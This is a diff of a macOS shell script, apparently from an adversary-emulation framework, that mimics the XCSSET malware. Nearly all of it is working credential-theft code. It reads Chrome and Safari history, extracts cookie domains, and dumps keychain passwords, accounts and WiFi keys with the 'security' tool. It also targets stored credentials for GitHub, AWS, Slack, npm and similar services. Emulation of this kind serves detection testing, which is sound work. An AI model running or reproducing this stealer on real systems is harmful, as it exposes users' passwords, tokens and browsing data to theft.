+            history_count=$(sqlite3 "$chrome_dir/History" "SELECT COUNT(*) FROM urls;" 2>/dev/null || echo "0")
+            printf "CHROME_HISTORY|count|%s\\n" "$history_count"
             
             # Extract recent URLs (no decryption needed)
-            $CMD_SQLITE3 "$chrome_dir/History" "SELECT url, title, visit_count FROM ur$CMD_LS ORDER BY last_visit_time DESC LIMIT 5;" 2>/dev/null | while IFS='|' read -r url title visits; do
-                $CMD_PRINTF "CHROME_HISTORY|%s|%s|%s\\n" "$url" "$title" "$visits"
+            sqlite3 "$chrome_dir/History" "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 5;" 2>/dev/null | while IFS='|' read -r url title visits; do
+                printf "CHROME_HISTORY|%s|%s|%s\\n" "$url" "$title" "$visits"
             done
         fi
     else
-        $CMD_PRINTF "CHROME_CREDENTIALS|not_found|Chrome not installed\\n"
+        printf "CHROME_CREDENTIALS|not_found|Chrome not installed\\n"
     fi
 }
 
 
 # Function: steal_safari_cookies
-# Description: steal_safari_cookies - Generated from YAML procedure
+# Description: steal_safari_cookies - Generated from YAML
 steal_safari_cookies() {
-    $CMD_PRINTF "SAFARI_CREDENTIALS|accessing|Safari data\\n"
+    printf "SAFARI_CREDENTIALS|accessing|Safari data\\n"
     
     # Try to access Safari cookies (requires FDA permissions)
     safari_cookies="$HOME/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies"
     if [ -f "$safari_cookies" ]; then
         cookie_size=$(stat -f%z "$safari_cookies")
-        $CMD_PRINTF "SAFARI_COOKIES|found|%s bytes\\n" "$cookie_size"
+        printf "SAFARI_COOKIES|found|%s bytes\\n" "$cookie_size"
         
         # Extract readable strings from binary cookies
-        cookie_domains=$(strings "$safari_cookies" | $CMD_GREP -E '\.(com|org|net)' | $CMD_HEAD -10)
-        $CMD_PRINTF "%s\n" "$cookie_domains" | while read -r domain; do
-            $CMD_PRINTF "SAFARI_COOKIE|domain|%s\\n" "$domain"
+        cookie_domains=$(strings "$safari_cookies" | grep -E '\.(com|org|net)' | head -10)
+        echo "$cookie_domains" | while read -r domain; do
+            printf "SAFARI_COOKIE|domain|%s\\n" "$domain"
         done
     else
         # Try alternative location
         alt_cookies="$HOME/Library/Cookies/Cookies.binarycookies"
         if [ -f "$alt_cookies" ]; then
             cookie_size=$(stat -f%z "$alt_cookies")
-            $CMD_PRINTF "SAFARI_COOKIES|found_alt|%s bytes\\n" "$cookie_size"
+            printf "SAFARI_COOKIES|found_alt|%s bytes\\n" "$cookie_size"
         fi
     fi
     
     # Extract Safari history
     safari_history="$HOME/Library/Safari/History.db"
     if [ -f "$safari_history" ]; then
-        history_count=$($CMD_SQLITE3 "$safari_history" "SELECT COUNT(*) FROM history_items;" 2>/dev/null || $CMD_PRINTF "%s\n" "0")
-        $CMD_PRINTF "SAFARI_HISTORY|count|%s\\n" "$history_count"
+        history_count=$(sqlite3 "$safari_history" "SELECT COUNT(*) FROM history_items;" 2>/dev/null || echo "0")
+        printf "SAFARI_HISTORY|count|%s\\n" "$history_count"
         
         # Extract recent URLs
-        $CMD_SQLITE3 "$safari_history" "SELECT url FROM history_items ORDER BY visit_time DESC LIMIT 5;" 2>/dev/null | while read -r url; do
-            $CMD_PRINTF "SAFARI_HISTORY|url|%s\\n" "$url"
+        sqlite3 "$safari_history" "SELECT url FROM history_items ORDER BY visit_time DESC LIMIT 5;" 2>/dev/null | while read -r url; do
+            printf "SAFARI_HISTORY|url|%s\\n" "$url"
         done
     fi
     
     # XCSSET-style keychain credential extraction
-    $CMD_PRINTF "KEYCHAIN_EXTRACTION|starting|Extracting saved passwords\\n"
+    printf "KEYCHAIN_EXTRACTION|starting|Extracting saved passwords\\n"
     
     # Extract generic passwords (app passwords, API keys, etc.)
-    $CMD_PRINTF "KEYCHAIN_GENERIC|extracting|Generic passwords\\n"
+    printf "KEYCHAIN_GENERIC|extracting|Generic passwords\\n"
     security find-generic-password -g 2>&1 | while read -r line; do
-        if $CMD_PRINTF "%s\n" "$line" | $CMD_GREP -q "password:"; then
-            password=$($CMD_PRINTF "%s\n" "$line" | $CMD_SED 's/password: "//' | $CMD_SED 's/"$//')
-            $CMD_PRINTF "KEYCHAIN_GENERIC|password|%s\\n" "$password"
-        elif $CMD_PRINTF "%s\n" "$line" | $CMD_GREP -q "acct"; then
-            account=$($CMD_PRINTF "%s\n" "$line" | $CMD_SED 's/.*"acct"<blob>="//;s/".*//')
-            $CMD_PRINTF "KEYCHAIN_GENERIC|account|%s\\n" "$account"
-        elif $CMD_PRINTF "%s\n" "$line" | $CMD_GREP -q "svce"; then
-            service=$($CMD_PRINTF "%s\n" "$line" | $CMD_SED 's/.*"svce"<blob>="//;s/".*//')
-            $CMD_PRINTF "KEYCHAIN_GENERIC|service|%s\\n" "$service"
+        if echo "$line" | grep -q "password:"; then
+            password=$(echo "$line" | sed 's/password: "//' | sed 's/"$//')
+            printf "KEYCHAIN_GENERIC|password|%s\\n" "$password"
+        elif echo "$line" | grep -q "acct"; then
+            account=$(echo "$line" | sed 's/.*"acct"<blob>="//;s/".*//')
+            printf "KEYCHAIN_GENERIC|account|%s\\n" "$account"
+        elif echo "$line" | grep -q "svce"; then
+            service=$(echo "$line" | sed 's/.*"svce"<blob>="//;s/".*//')
+            printf "KEYCHAIN_GENERIC|service|%s\\n" "$service"
         fi
     done
     
     # Extract internet passwords (website credentials)
-    $CMD_PRINTF "KEYCHAIN_INTERNET|extracting|Internet passwords\\n"
+    printf "KEYCHAIN_INTERNET|extracting|Internet passwords\\n"
     security find-internet-password -g 2>&1 | while read -r line; do
-        if $CMD_PRINTF "%s\n" "$line" | $CMD_GREP -q "password:"; then
-            password=$($CMD_PRINTF "%s\n" "$line" | $CMD_SED 's/password: "//' | $CMD_SED 's/"$//')
-            $CMD_PRINTF "KEYCHAIN_INTERNET|password|%s\\n" "$password"
-        elif $CMD_PRINTF "%s\n" "$line" | $CMD_GREP -q "acct"; then
-            account=$($CMD_PRINTF "%s\n" "$line" | $CMD_SED 's/.*"acct"<blob>="//;s/".*//')
-            $CMD_PRINTF "KEYCHAIN_INTERNET|account|%s\\n" "$account"
-        elif $CMD_PRINTF "%s\n" "$line" | $CMD_GREP -q "srvr"; then
-            server=$($CMD_PRINTF "%s\n" "$line" | $CMD_SED 's/.*"srvr"<blob>="//;s/".*//')
-            $CMD_PRINTF "KEYCHAIN_INTERNET|server|%s\\n" "$server"
+        if echo "$line" | grep -q "password:"; then
+            password=$(echo "$line" | sed 's/password: "//' | sed 's/"$//')
+            printf "KEYCHAIN_INTERNET|password|%s\\n" "$password"
+        elif echo "$line" | grep -q "acct"; then
+            account=$(echo "$line" | sed 's/.*"acct"<blob>="//;s/".*//')
+            printf "KEYCHAIN_INTERNET|account|%s\\n" "$account"
+        elif echo "$line" | grep -q "srvr"; then
+            server=$(echo "$line" | sed 's/.*"srvr"<blob>="//;s/".*//')
+            printf "KEYCHAIN_INTERNET|server|%s\\n" "$server"
         fi
     done
     
     # Target specific high-value services like XCSSET does
-    $CMD_PRINTF "KEYCHAIN_TARGETED|extracting|High-value targets\\n"
+    printf "KEYCHAIN_TARGETED|extracting|High-value targets\\n"
     
     # Common targets that XCSSET looks for
     high_value_services=("github" "aws" "google" "apple" "microsoft" "slack" "docker" "npm")
@@ -2234,32 +2232,49 @@ steal_safari_cookies() {
     for service in "${high_value_services[@]}"; do
         # Try to extract specific service credentials
         cred_data=$(security find-generic-password -s "$service" -g 2>&1 || true)
-        if $CMD_PRINTF "%s\n" "$cred_data" | $CMD_GREP -q "password:"; then
-            password=$($CMD_PRINTF "%s\n" "$cred_data" | $CMD_GREP "password:" | $CMD_SED 's/password: "//' | $CMD_SED 's/"$//')
-            $CMD_PRINTF "KEYCHAIN_TARGETED|%s|password|%s\\n" "$service" "$password"
+        if echo "$cred_data" | grep -q "password:"; then
+            password=$(echo "$cred_data" | grep "password:" | sed 's/password: "//' | sed 's/"$//')
+            printf "KEYCHAIN_TARGETED|%s|password|%s\\n" "$service" "$password"
         fi
         
-        account=$($CMD_PRINTF "%s\n" "$cred_data" | $CMD_GREP "acct" | $CMD_SED 's/.*"acct"<blob>="//;s/".*//' || true)
+        account=$(echo "$cred_data" | grep "acct" | sed 's/.*"acct"<blob>="//;s/".*//' || true)
         if [ -n "$account" ]; then
-            $CMD_PRINTF "KEYCHAIN_TARGETED|%s|account|%s\\n" "$service" "$account"
+            printf "KEYCHAIN_TARGETED|%s|account|%s\\n" "$service" "$account"
         fi
     done
     
     # Extract WiFi passwords (common XCSSET target)
-    $CMD_PRINTF "KEYCHAIN_WIFI|extracting|WiFi passwords\\n"
+    printf "KEYCHAIN_WIFI|extracting|WiFi passwords\\n"
     security find-generic-password -D "AirPort network password" -g 2>&1 | while read -r line; do
-        if $CMD_PRINTF "%s\n" "$line" | $CMD_GREP -q "password:"; then
-            wifi_password=$($CMD_PRINTF "%s\n" "$line" | $CMD_SED 's/password: "//' | $CMD_SED 's/"$//')
-            $CMD_PRINTF "KEYCHAIN_WIFI|password|%s\\n" "$wifi_password"
-        elif $CMD_PRINTF "%s\n" "$line" | $CMD_GREP -q "acct"; then
-            wifi_network=$($CMD_PRINTF "%s\n" "$line" | $CMD_SED 's/.*"acct"<blob>="//;s/".*//')
-            $CMD_PRINTF "KEYCHAIN_WIFI|network|%s\\n" "$wifi_network"
+        if echo "$line" | grep -q "password:"; then
+            wifi_password=$(echo "$line" | sed 's/password: "//' | sed 's/"$//')
+            printf "KEYCHAIN_WIFI|password|%s\\n" "$wifi_password"
+        elif echo "$line" | grep -q "acct"; then
+            wifi_network=$(echo "$line" | sed 's/.*"acct"<blob>="//;s/".*//')
+            printf "KEYCHAIN_WIFI|network|%s\\n" "$wifi_network"
         fi
     done
 } 
 
 
 JOB_ID=$(core_generate_job_id)
+
+# Purpose: Get log filename dynamically based on PROCEDURE_NAME
+# Inputs: None
+# Outputs: Log filename string
+# - Sets LOG_FILE_NAME and SYSLOG_TAG globals if not already set
+core_get_log_filename() {
+    if [ -z "$LOG_FILE_NAME" ]; then
+        if [ -n "$PROCEDURE_NAME" ]; then
+            LOG_FILE_NAME="${TTP_ID}_${PROCEDURE_NAME}.log"
+            SYSLOG_TAG="${TTP_ID}_${PROCEDURE_NAME}"
+        else
+            LOG_FILE_NAME="${TTP_ID}.log"
+            SYSLOG_TAG="${TTP_ID}"
+        fi
+    fi
+    echo "$LOG_FILE_NAME"
+}
 
 # Execute main function with all arguments
 core_main "$@" 
